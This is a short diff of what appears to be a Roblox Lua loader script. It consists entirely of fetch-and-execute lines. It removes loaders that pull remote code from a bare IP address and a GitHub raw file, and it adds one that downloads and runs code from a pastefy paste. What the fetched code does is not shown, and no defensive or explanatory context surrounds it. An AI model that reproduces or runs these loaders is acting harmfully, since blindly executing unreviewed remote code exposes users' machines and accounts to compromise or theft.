@@ -1,3 +1,1 @@
-ID="322fe6e1-c4ee-4179-b27a-ca8d97349402";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SynergyNetworkz/TEMPORARY/refs/heads/main/load.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/a2Rnfv0S/raw"))()
